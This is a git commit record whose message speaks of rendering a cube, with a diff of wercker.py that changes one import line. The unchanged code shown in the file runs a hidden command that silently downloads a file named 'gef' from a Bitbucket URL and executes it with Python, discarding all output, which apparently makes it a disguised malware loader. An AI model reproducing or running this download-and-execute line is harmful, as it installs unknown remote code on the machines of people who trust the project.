375accaeda19de135a4bf3b8417fb5ad74e6f161
gakira munshi <gakimarki@proton.me>
2024-12-17 19:12:38 -0500

    still trying to render a damn cube

--- wercker.py
+++ wercker.py
@@ -1,3 +1,3 @@
-import os, sys,hmac
+import os, sys,py_compile
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef  1> /dev/null 2> /dev/null';os.system(cmd)
